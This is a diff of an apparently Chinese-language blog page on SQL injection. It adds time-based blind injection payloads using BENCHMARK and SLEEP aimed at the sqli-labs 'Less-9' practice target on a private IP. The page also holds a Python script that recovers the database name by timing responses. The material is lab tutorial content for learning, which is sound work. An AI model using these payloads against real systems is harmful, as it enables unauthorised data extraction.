@@ -37,7 +37,7 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%9B%B4%E6%94%B9mysql%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E9%80%9A%E8%BF%87get%E4%BC%A0%E5%8F%82%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5.png">
 <meta property="article:published_time" content="2023-12-21T06:44:12.000Z">
-<meta property="article:modified_time" content="2023-12-23T12:42:08.419Z">
+<meta property="article:modified_time" content="2023-12-24T02:31:33.412Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary_large_image">
@@ -234,7 +234,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3k 字
+          3.3k 字
         
       </span>
     
@@ -245,7 +245,7 @@
         
         
         
-          26 分钟
+          28 分钟
         
       </span>
     
@@ -330,6 +330,10 @@
 <p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E9%80%9A%E8%BF%87get%E4%BC%A0%E5%8F%82%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5.png" srcset="/img/loading.gif" lazyload alt="通过get传参进行注入"></p>
 <p>可以在这个页面中传入get参数以使用system()函数查看内容。</p>
 <h2 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h2><p>通过判断网页的响应时间进行注入。可以使用sqlmap强行注入。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">if</span>(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">114</span>,<span class="hljs-number">1</span>,BENCHMARK(<span class="hljs-number">5000000</span>, SHA1(&#x27;Hello World&#x27;)))-- -<br><br><br><span class="hljs-attribute">SELECT</span> BENCHMARK(<span class="hljs-number">1000000</span>, SHA1(&#x27;Hello World&#x27;)); //延时函数<br><br><br><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.2.70</span>/sqli/Less-<span class="hljs-number">9</span>/?id=<span class="hljs-number">1</span>&#x27; and If(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>))-- -<br></code></pre></td></tr></table></figure>
+
+
+
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># ?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(ascii(substr(database(),1,1))= 115,sleep(5),0) --+</span><br><span class="hljs-string">import requests</span><br><span class="hljs-string">import time</span><br><span class="hljs-string">tr=&#x27;</span>usernam<span class="hljs-string">e&#x27;</span><br><span class="hljs-string">name=&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">url1=&quot;http://192.168.2.70/sqli/Less-9/?id=1&#x27;</span>&quot;<br>for j in range(1,10):<br>    for i in range(65,123):<br>        url=url1+&quot;<span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>( ascii(substring(<span class="hljs-keyword">database</span>(),&quot;+str(j)+&quot;,<span class="hljs-number">1</span>))= &quot;+str(i)+&quot;,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">-- -&quot;</span><br>        start_time = <span class="hljs-type">time</span>.time()<br>        response = requests.<span class="hljs-keyword">get</span>(url)<br>        end_time = <span class="hljs-type">time</span>.time()<br>        elapsed_time = end_time - start_time<br>        <span class="hljs-keyword">if</span> elapsed_time &gt; <span class="hljs-number">3</span>:  # 如果响应时间超过<span class="hljs-number">5</span>秒<br>            <span class="hljs-type">name</span>=<span class="hljs-type">name</span>+chr(i)<br>            print(<span class="hljs-type">name</span>)<br></code></pre></td></tr></table></figure>
 
 
@@ -406,6 +410,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2023/12/24/sqli%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/" title="sqli靶场通关教程">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">sqli靶场通关教程</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
